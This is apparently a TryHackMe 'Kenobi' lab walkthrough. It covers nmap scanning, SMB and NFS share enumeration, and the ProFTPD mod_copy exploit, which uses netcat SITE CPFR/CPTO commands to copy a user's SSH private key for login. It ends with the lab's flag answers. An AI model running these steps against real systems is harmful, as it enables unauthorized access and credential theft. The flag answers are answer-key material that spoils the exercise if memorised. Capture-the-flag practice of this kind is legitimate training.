# Kenobi Wlakthrough
### Link
- https://tryhackme.com/room/kenobi
------------------------
### Task1 -  Deploy the vulnerable machine
- Scan the machine with nmap, how many ports are open?
    - sudo nmap -sV -sC -oN ./nmap_kenobi_result.txt [IP]
    - **Answer** : 7
    - pictures:<br>
                [Kenobi_1.png](https://github.com/LNB283/THM/blob/main/EASY/Kenobi/Pictures/Kenobi_1.png)<br>
                [Kenobi_2.png](https://github.com/LNB283/THM/blob/main/EASY/Kenobi/Pictures/Kenobi_2.png)
------------------------
### Task 2 - Enumerating Samba for shares
- Using the nmap command above, how many shares have been found?
    - nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [IP]
    - **Answer** : 3
    - pictures:<br>
                [Kenobi_3.png](https://github.com/LNB283/THM/blob/main/EASY/Kenobi/Pictures/Kenobi_3.png)
- Check Enonymous share
    - smbclient //[IP]/anonymous
    - Try without password
    - Once you're connected, list the files on the share. What is the file can you see?
    - **Answer** : log.txt
    - picture: [Kenobi_4.png](https://github.com/LNB283/THM/blob/main/EASY/Kenobi/Pictures/Kenobi_4.png)
- Download the file **log.txt**. We can use SMB to do this action (recursive)
    - smbget -R smb://[IP]/anonymous
    - picture: [Kenobi_5.png](https://github.com/LNB283/THM/blob/main/EASY/Kenobi/Pictures/Kenobi_5.png)
-  Port 111 is access to a network file system.
    - nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
    - What mount can we see?
    - **Answer** : /var
    - picture: [Kenobi_6.png](https://github.com/LNB283/THM/blob/main/EASY/Kenobi/Pictures/Kenobi_6.png)
------------------------
### Task 3 - Gain initial access with ProFtpd
- What is the version?
    - Check the initial nmap scan.
    - **Answer** : 1.3.5
    - picture: [Kenobi_1.png](https://github.com/LNB283/THM/blob/main/EASY/Kenobi/Pictures/Kenobi_1.png)
- How many exploits are there for the ProFTPd running?
    - We can use searchsploit to find exploits for this particular version.
    - **Answer** : 3
    - picture: [Kenobi_8.png](https://github.com/LNB283/THM/blob/main/EASY/Kenobi/Pictures/Kenobi_8.png)
- One exploit is related to "mod copy". Check this link to understand more about [mod copy](http://www.proftpd.org/docs/contrib/mod_copy.html)
    - Connect to the machine by using **mod copy**
        - sudo nc [IP] [port]
        - SITE CPFR /home/kenobi/.ssh/id_rsa --> Copy the private key
        - SITE CPTO /var/tmp/id_rsa --> Paste to /var/tmp because var directory is reachable with Anonymous
        - picture: [Kenobi_9.png](https://github.com/LNB283/THM/blob/main/EASY/Kenobi/Pictures/Kenobi_9.png)
    - From the local machine
        - mkdir /mnt/kenobiNFS
        - mount machine_ip:/var /mnt/kenobiNFS
        - ls -la /mnt/kenobiNFS
        - We can see all directories & files under /var
        - - picture: [Kenobi_10.png](https://github.com/LNB283/THM/blob/main/EASY/Kenobi/Pictures/Kenobi_10.png) 
    - Last steps :
        - Copy the private key and log to the machine through SSH with kenobi as username
        - Open /home/kenobi/user.txt
    - **Answer** : d0b0f3f53b6caa532a83915e19224899